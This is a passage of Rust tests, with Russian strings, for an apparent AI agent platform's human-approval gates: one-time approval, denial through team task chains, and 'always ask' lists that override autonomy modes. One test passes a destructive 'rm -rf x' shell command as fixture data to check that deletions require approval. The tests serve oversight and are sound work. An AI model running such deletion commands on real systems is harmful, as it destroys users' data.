    let id = t.start_and_wait_for_the_card(&file).await;
    t.script("Бета", vec![write(&file), say("записал")]);
    t.crew.clear_events();
    t.crew.ok("POST", &format!("/api/approvals/{id}"), Some(json!({ "answer": "once" }))).await;
    common::wait_until("задача закончена", 40, || async { t.tasks().first().is_some_and(|t| t["state"] == "done") }).await;
    assert!(file.exists(), "разрешённый вызов выполнен");
    assert_eq!(t.crew.count_events(|e| e["type"] == "approval"), 0, "разовое разрешение подошло: запись та же, новой карточки нет");
    assert!(t.beta_saw("Человек разрешил:"), "исполнитель получил решение");
    let runs = team_runs(&t.crew);
    assert_eq!(runs.len(), 1, "{runs:?}");
    assert_eq!(runs[0]["state"]["kind"], "done");
    let _ = std::fs::remove_dir_all(&t.dir);
}

#[tokio::test(flavor = "multi_thread")]
async fn a_team_task_hears_a_late_deny_and_does_not_ask_again() {
    let t = team_setup("ap-team-deny").await;
    let file = t.dir.join("a").join("x.txt");
    let id = t.start_and_wait_for_the_card(&file).await;
    t.script("Бета", vec![say("обошёлся без записи")]);
    t.crew.clear_events();
    t.crew.ok("POST", &format!("/api/approvals/{id}"), Some(json!({ "answer": "deny" }))).await;
    common::wait_until("задача закончена", 40, || async { t.tasks().first().is_some_and(|t| t["state"] == "done") }).await;
    assert!(!file.exists());
    assert!(t.beta_saw("Человек запретил:"), "исполнитель получил запрет и пояснение");
    assert_eq!(t.crew.count_events(|e| e["type"] == "approval"), 0);
    let _ = std::fs::remove_dir_all(&t.dir);
}

#[tokio::test(flavor = "multi_thread")]
async fn a_queued_task_whose_sender_turn_ended_still_gets_only_the_folders_of_the_whole_chain() {
    let (mut crew, fake) = named_crew("ap-queued-chain", &[]).await;
    let ids = named_bots(&crew, &[("First", "auto"), ("Middle", "auto"), ("Last", "ask")]).await;
    let dir = outside("queued-chain");
    let folder = dir.join("a");
    make_team(&crew, &[&ids[1], &ids[2]], &folder).await;
    // Бот состоит только в одной команде: First ведёт свою, вне команды ведущий поручает ведущему (Middle ведёт общую с Last).
    crew.ok("POST", "/api/rooms", Some(json!({ "name": "Верх", "botIds": [ids[0]], "lead": ids[0] }))).await;
    // Задача Middle→Last, выданная в ходе, который First передал Middle: самого хода Middle к запуску уже нет, цепочка лежит в записи.
    let now = std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH).unwrap().as_millis() as i64;
    let task = json!([{
        "id": "task_chain", "from": ids[1], "fromName": "Middle", "to": ids[2], "toName": "Last", "text": "write", "files": [],
        "state": "queued", "created": now, "floor": "auto", "unattended": false, "depth": 1, "room": "", "above": [ids[0]], "outside": false,
    }]);
    fake.script("Last", vec![write(&folder.join("chain.txt")), say("last")]);
    let data_dir = crew.data_dir.clone();
    crew.keep_data();
    drop(crew);
    std::fs::write(data_dir.join("team_tasks.json"), serde_json::to_vec(&task).unwrap()).unwrap();
    let crew = Crew::start_at(data_dir, &[]).await;
    crew.listen().await;
    // Задача началась до `listen`: карточку берём из списка «Нужен ты». First не в команде с папкой: у Last по цепочке её нет.
    common::wait_until("карточка у Last", 30, || async { needs(&crew).await["count"] == 1 }).await;
    let card = needs(&crew).await["items"][0].clone();
    assert_eq!(card["kind"], "approval", "{card}");
    assert!(card.to_string().contains(&ids[2]), "{card}");
    crew.ok("POST", &format!("/api/approvals/{}", card["id"].as_str().unwrap()), Some(json!({ "answer": "deny" }))).await;
    common::wait_until("задача закрыта", 30, || async { std::fs::read_to_string(crew.data_dir.join("team_tasks.json")).is_ok_and(|t| t.contains("\"state\":\"done\"")) }).await;
    assert!(!folder.join("chain.txt").exists());
    let _ = std::fs::remove_dir_all(&dir);
}

#[tokio::test(flavor = "multi_thread")]
async fn the_always_ask_list_beats_the_mode_and_stored_rules() {
    let (crew, fake, bot) = setup("ap-always-ask", &[]).await;
    let dir = outside("always-ask");
    let at = dir.join("a").display().to_string();
    let add = tool("run_command", json!({ "command": format!("git -C \"{at}\" add .") }));

    // Правило «всегда» для этой команды (режим «спрашивать»), потом «Свобода действий».
    turn(&crew, &fake, &bot, add.clone(), Some("always")).await.expect("первая команда спрашивает");
    assert!(turn(&crew, &fake, &bot, add.clone(), None).await.is_none(), "по правилу без карточки");
    set_mode(&crew, &bot, "auto").await;
    assert!(turn(&crew, &fake, &bot, add.clone(), None).await.is_none(), "список пуст: «решай сам» не спрашивает");

    // Список «команды»: карточка при «решай сам», правило не пропускает, «запомнить» не предлагается.
    crew.ok("PATCH", &format!("/api/bots/{bot}"), Some(json!({ "alwaysAsk": ["command"] }))).await;
    let card = turn(&crew, &fake, &bot, add.clone(), None).await.expect("список сильнее режима и правила");
    assert_eq!(card["grantable"], false, "{card}");
    assert_eq!(card["always"], false, "{card}");
    assert_eq!(card["conversation"], false, "{card}");

    // Другой вид в списке команду не трогает.
    crew.ok("PATCH", &format!("/api/bots/{bot}"), Some(json!({ "alwaysAsk": ["send"] }))).await;
    assert!(turn(&crew, &fake, &bot, add, None).await.is_none());
    let _ = std::fs::remove_dir_all(&dir);
}

#[tokio::test(flavor = "multi_thread")]
async fn the_rights_summary_follows_the_mode() {
    let (crew, _fake, bot) = setup("ap-rights", &[]).await;
    for (mode, writes_free) in [("strict", false), ("ask", true), ("auto", true)] {
        set_mode(&crew, &bot, mode).await;
        let rights = crew.ok("GET", &format!("/api/bots/{bot}/rights"), None).await;
        assert_eq!(rights["mode"], mode, "{rights}");
        assert!(rights["modeText"].as_str().unwrap().len() > 10, "{rights}");
        let free = rights["allowed"].as_array().unwrap().iter().any(|s| s == "писать файлы в своей папке");
        assert_eq!(free, writes_free, "{mode}: {rights}");
        assert!(rights["allowed"].as_array().unwrap().iter().any(|s| s == "читать файлы и искать"), "{mode}: чтение свободно");
        assert!(rights["asks"].as_array().unwrap().iter().any(|s| s.as_str().unwrap().contains("выпуск наружу")), "{mode}: {rights}");
        assert_eq!(rights["alwaysAsk"].as_array().unwrap().len(), 7);
        assert!(rights["alwaysAsk"].as_array().unwrap().iter().all(|k| k["on"] == false));
    }
    crew.ok("PATCH", &format!("/api/bots/{bot}"), Some(json!({ "alwaysAsk": ["pay"] }))).await;
    let rights = crew.ok("GET", &format!("/api/bots/{bot}/rights"), None).await;
    let pay = rights["alwaysAsk"].as_array().unwrap().iter().find(|k| k["id"] == "pay").unwrap().clone();
    assert_eq!(pay["on"], true, "{rights}");
}

#[tokio::test(flavor = "multi_thread")]
async fn the_always_ask_list_asks_by_the_kind_of_a_real_call() {
    let (crew, fake, bot) = setup("ap-always-kinds", &[]).await;
    set_mode(&crew, &bot, "auto").await;
    // Команда удаления: вид берётся из `reach::command_place`. Без списка в «решай сам» её не спрашивают.
    let rm_call = tool("run_command", json!({ "command": "rm -rf x" }));
    assert!(turn(&crew, &fake, &bot, rm_call.clone(), None).await.is_none(), "список пуст: без карточки");
    crew.ok("PATCH", &format!("/api/bots/{bot}"), Some(json!({ "alwaysAsk": ["delete"] }))).await;
    // Команда удаления: вид берётся из `reach::command_place`.
    let rm = turn(&crew, &fake, &bot, rm_call, None).await;
    assert!(rm.is_some(), "[delete] спрашивает rm -rf");
    // Команда, которую разобрать нельзя (подстановка), — только вид `command`: при [delete] идёт без карточки.
    let opaque = turn(&crew, &fake, &bot, tool("run_command", json!({ "command": "echo %CD%" })), None).await;
    assert!(opaque.is_none(), "неразобранная команда не относится к [delete]");
    crew.ok("PATCH", &format!("/api/bots/{bot}"), Some(json!({ "alwaysAsk": ["command"] }))).await;
    assert!(turn(&crew, &fake, &bot, tool("run_command", json!({ "command": "echo %CD%" })), None).await.is_some(), "[command] спрашивает любую команду");
}
